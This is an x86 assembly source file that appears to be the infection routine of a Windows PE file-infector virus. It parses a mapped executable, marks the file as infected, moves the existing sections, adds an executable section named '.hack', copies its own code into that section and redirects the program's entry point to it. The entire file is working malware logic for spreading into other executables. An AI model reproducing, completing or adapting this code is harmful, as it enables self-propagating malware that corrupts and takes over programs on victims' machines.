
ifndef	INFECT_FILE_ASM_
INFECT_FILE_ASM_ MACRO
ENDM

include	utils.asm

; Parse and modify the executable mapped in memory to inject our code.
; ebx = delta offset
infect_file PROC NEAR fileptr:DWORD, filesize:DWORD, virtualalloc_addr:DWORD, virtualfree_addr:DWORD

LOCAL	lastsec_ptrtorawdata:DWORD
LOCAL	lastsec_sizeofrawdata:DWORD
LOCAL	lastsec_virtualaddress:DWORD
LOCAL	lastsec_virtualsize:DWORD

LOCAL	ptr_adressofentrypoint:DWORD
LOCAL	ptr_numberofsections:DWORD
LOCAL	ptr_sizeofcode:DWORD
LOCAL	ptr_sizeofimage:DWORD
LOCAL	ptr_sizeofheaders:DWORD

LOCAL	imagebase:DWORD
LOCAL	filealignment:DWORD
LOCAL	oldentrypoint:DWORD
LOCAL	pointertorawdata:DWORD
LOCAL	ptr_sectionhdrtable:DWORD
LOCAL	sectionalignment:DWORD
LOCAL	tmpbuf:DWORD

	pushad

	mov		esi, fileptr				; esi -> IMAGE_DOS_HEADER

	cmp		WORD ptr [esi], "ZM"		;
	jne		infect_err					; Check DOS signature

	mov		ecx, 042h
	cmp		[esi + 034h], ecx
	je		infect_err					; Check if file already infected. Infection marker at IMAGE_DOS_HEADER + 0x34 (e_res2[8])
	mov		[esi + 034h], ecx			; mark file as infected.

	add		esi, [esi + 03ch]			; esi -> IMAGE_NT_HEADERS

	cmp     word ptr [esi], "EP"		;
	jne		infect_err					; Check PE signature

	push	esi							; esi -> IMAGE_NT_HEADERS

	add		esi, 04h					; esi -> IMAGE_FILE_HEADER

	lea		ecx, [esi + 02h]			;
	mov		ptr_numberofsections, ecx	; Got IMAGE_NT_HEADER.NumberOfSections

	pop		esi							; esi -> IMAGE_NT_HEADERS
	push	esi
	add		esi, 018h					; esi -> IMAGE_OPTIONAL_HEADER
	
	xor		ecx, ecx													; DataDirectory[11] = export table bound headers.
	mov		[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY)], ecx		; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualAddress = 0
	mov		[esi + (60h + 11 * SIZEOF IMAGE_DATA_DIRECTORY) + 4], ecx	; IMAGE_OPTIONAL_HEADER.DataDirectory[11].VirtualSize = 0
																		; We have to do this b/c in some cases it overlaps with our new header of section.

    cmp     word ptr [esi], 010bh       ; Check 32bit magic (010bh)
    jne     infect_err

	lea		ecx, [esi + 04h]			;
	mov		ptr_sizeofcode, ecx			; Got IMAGE_OPTIONAL_HEADER.SizeOfCode
	lea		ecx, [esi + 010h]			;
	mov		ptr_adressofentrypoint, ecx	; Got IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint
	mov		ecx, [esi + 01ch]			;
	mov		imagebase, ecx				; Got IMAGE_OPTIONAL_HEADER.ImageBase
	mov		ecx, [esi + 020h]			;
	mov		sectionalignment, ecx		; Got IMAGE_OPTIONAL_HEADER.SectionAlignment
	mov		ecx, [esi + 024h]			;
	mov		filealignment, ecx			; Got IMAGE_OPTIONAL_HEADER.FileAlignment
	lea		ecx, [esi + 038h]			;
	mov		ptr_sizeofimage, ecx		; Got IMAGE_OPTIONAL_HEADER.SizeOfImage
	lea		ecx, [esi + 03ch]			;
	mov		ptr_sizeofheaders, ecx		; Got IMAGE_OPTIONAL_HEADER.SizeOfHeaders

	pop		esi							; esi -> IMAGE_NT_HEADERS

	add		esi, SIZEOF IMAGE_NT_HEADERS; esi -> IMAGE_SECTION_HEADER[0]
	mov		ptr_sectionhdrtable, esi

	mov		ecx, ptr_numberofsections
	xor		eax, eax
	mov		ax, WORD ptr [ecx]			; eax = number of sections ( = *ptr_numberofsections)
	
	mov		ecx, SIZEOF IMAGE_SECTION_HEADER
	sub		eax, 1
	mul		ecx
	add		esi, eax					; esi -> IMAGE_SECTION_HEADER[last]

	mov		ecx, [esi + 08h]
	mov		lastsec_virtualsize, ecx	; Got IMAGE_SECTION_HEADER[last].SizeOfRawData	
	mov		ecx, [esi + 0ch]
	mov		lastsec_virtualaddress, ecx	; Got IMAGE_SECTION_HEADER[last].SizeOfRawData	
	mov		ecx, [esi + 010h]
	mov		lastsec_sizeofrawdata, ecx	; Got IMAGE_SECTION_HEADER[last].SizeOfRawData	
	mov		ecx, [esi + 014h]
	mov		lastsec_ptrtorawdata, ecx	; Got IMAGE_SECTION_HEADER[last].PointerToRawData
	
; --------------------------------------> If the first section starts before 0x400 in the file, we won't have enough space for our extra header.
; --------------------------------------> That's why if it is the case we need to move all the sections in the file by filealignment bytes.

	; mov		ecx, ptr_sizeofheaders
	; mov		ecx, [ecx]
	; cmp		ecx, 0400h
	; jae		dont_move_sections			; If header is already big enough we don't need to move everything.

	push	esi							; esi -> IMAGE_SECTION_HEADER[last]

	mov		esi, ptr_sectionhdrtable	; esi -> IMAGE_SECTION_HEADER[0]
	mov		esi, [esi + 014h]			; esi = IMAGE_SECTION_HEADER[0].PointerToRawData
	add		esi, fileptr				; esi is now destination pointer for memmove()
	mov		edi, filealignment
	add		edi, esi					; destination is just 1 filealignment further.
	mov		edx, lastsec_ptrtorawdata
	add		edx, lastsec_sizeofrawdata
	mov		ecx, ptr_sectionhdrtable	;
	sub		edx, [ecx + 014h]			; edx -= IMAGE_SECTION_HEADER[0].PointerToRawData. We don't copy the headers and padding to first section.

	; Now, edi -> destination, esi -> source, edx = quantity.
	; Need to malloc a temporary buffer to move the overlapping fields. Stack will explode if we use it.

	push	edi
	push	esi
	push	edx							; Save registers b/c of function call.

	push    04h							; read/write permissions
	push    00001000h					; MEM_COMMIT
	push    edx							; size to allocate
	push    0							; address. NULL == we want a new address
	call    virtualalloc_addr			; VirtualAlloc()
	mov     tmpbuf, eax
	cmp		eax, 0
	je		infect_err

	pop		edx
	pop		esi
	pop		edi							; Restore registers after function call.

	push	edi
	mov		edi, tmpbuf
	call	my_memcpy					; copy sections to tmpbuf
	pop		edi							; edi -> destination
	mov		esi, tmpbuf
	call	my_memcpy					; copy sections back to mapped file.

	push	08000h
	push	0
	push	tmpbuf
	call	virtualfree_addr

; --------------------------------------> Update all section headers for new sections offsets in file, ie add filealignment to their offset.

	xor		edx, edx
	mov		edi, ptr_numberofsections
	xor		eax, eax
	mov		ax, WORD ptr [edi]			; eax = number of sections ( = *ptr_numberofsections)
	mov		edi, eax					; edi = numberofsections
	mov		esi, ptr_sectionhdrtable	; esi -> IMAGE_SECTION_HEADER[0]
update_sec_hdrs:
	mov		ecx, [esi + 014h]			; esi -> IMAGE_SECTION_HEADER[edx].PointerToRawData
	add		ecx, filealignment			;
	mov		[esi + 014h], ecx			; IMAGE_SECTION_HEADER[edx].PointerToRawData += filealignment
	inc		edx
	add		esi, SIZEOF IMAGE_SECTION_HEADER
	cmp		edx, edi					; while edx < numberofsections
	jne		update_sec_hdrs

dont_move_sections:
; --------------------------------------> Now we can move on to write our new section header.

	pop		esi							; esi -> IMAGE_SECTION_HEADER[last]

	add		esi, SIZEOF IMAGE_SECTION_HEADER	; esi -> IMAGE_SECTION_HEADER[last + 1]

	push	esi									;
	mov		edi, esi							;
	mov		esi, 0								;
	mov		edx, SIZEOF IMAGE_SECTION_HEADER	;
	call	my_memset							;
	pop		esi									; Initialize new section header.

	push	esi							; esi save -> IMAGE_SECTION_HEADER[last + 1]

	mov		ecx, "cah."					;
	mov		[esi], ecx					;
	add		esi, 04h					;
	mov		ecx, "k"					;
	mov		[esi], ecx					; Wrote the name of our new section. Niark niark niark...
	
	add		esi, 04h					; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualSize
	mov		ecx, end_copy - begin_copy
	mov		[esi], ecx					; Wrote VirtualSize

	add		esi, 04h					; esi -> IMAGE_SECTION_HEADER[last + 1].VirtualAddress
	mov		ecx, lastsec_virtualaddress
	add		ecx, lastsec_virtualsize
	invoke	ceil_align, ecx, sectionalignment
	mov		[esi], eax					; Wrote VirtualAddress

	add		esi, 04h					; esi -> IMAGE_SECTION_HEADER[last + 1].SizeOfRawData
	mov		ecx, end_copy - begin_copy
	invoke	ceil_align, ecx, filealignment	; Align size of our code with fileAlignment
	mov		[esi], eax					; Wrote SizeOfRawData
	mov		filesize, eax				; new filesize, still need to add pointertorawdata (step 1/2)

	add		esi, 04h					; esi -> IMAGE_SECTION_HEADER[last + 1].PointerToRawData
	mov		ecx, lastsec_ptrtorawdata
	add		ecx, lastsec_sizeofrawdata
	add		ecx, 0200h					; For when we move the sections (see around update_sec_hdrs: label)
	mov		[esi], ecx					; Wrote PointerToRawData
	mov		pointertorawdata, ecx
	add		ecx, filesize				;
	mov		filesize, ecx				; Got our new file size (step 2/2)

	pop		esi							; esi -> IMAGE_SECTION_HEADER[last + 1]
	add		esi, 024h					; esi -> IMAGE_SECTION_HEADER[last + 1].Characteristics

	mov		ecx, 060000020h				; Contains code | readable | executable
	mov		[esi], ecx

; --------------------------------------> New section header finally written. Phew !
; --------------------------------------> Now, let's update the right fields.

	mov		ecx, ptr_adressofentrypoint
	mov		edx, [ecx]
	mov		oldentrypoint, edx
	mov		edx, lastsec_virtualaddress			;
	add		edx, lastsec_virtualsize			;
	invoke	ceil_align, edx, sectionalignment	;
	add		eax, start - begin_copy				; newentrypoint = lastsec_virtualaddress + ceil_align(lastsec_virtualsize, sectionalignment) + (start - begin_copy)
	mov		[ecx], eax					; Updated AddressOfEntryPoint

	mov		ecx, ptr_numberofsections
	mov		edx, [ecx]
	inc		edx
	mov		[ecx], edx					; Updated NumberOfSections

	mov		ecx, ptr_sizeofcode
	mov		edx, [ecx]
	add		edx, end_copy - begin_copy
	invoke	ceil_align, edx, sectionalignment
	mov		[ecx], eax					; Updated SizeOfCode

	mov		ecx, ptr_sizeofimage
	mov		edx, [ecx]
	add		edx, end_copy - begin_copy
	invoke	ceil_align, edx, sectionalignment
	mov		[ecx], eax					; Updated SizeOfImage

; --------------------------------------> PE fields updated.
; --------------------------------------> Let's write our code where it belongs.

	mov		edi, fileptr
	add		edi, pointertorawdata
	push	esi
	mov		esi, begin_copy
	add		esi, ebx					; ebx = delta offset. This is to be position independent.
	mov		edx, end_copy - begin_copy
	call	my_memcpy
	pop		esi							; Wrote new section to infected file.

; --------------------------------------> Write oldentrypoint to the 4 first bytes of infected file

	mov		ecx, fileptr
	add		ecx, pointertorawdata
	mov		edx, oldentrypoint
	mov		[ecx], edx					; Wrote oldentrypoint to new section.

	popad

	; mov		eax, 1
	; jmp		end_infect					; return 0 or 1 depending on error.
infect_err:
end_infect:
	mov		eax, filesize

	ret
infect_file ENDP

endif ; INFECT_FILE_ASM_
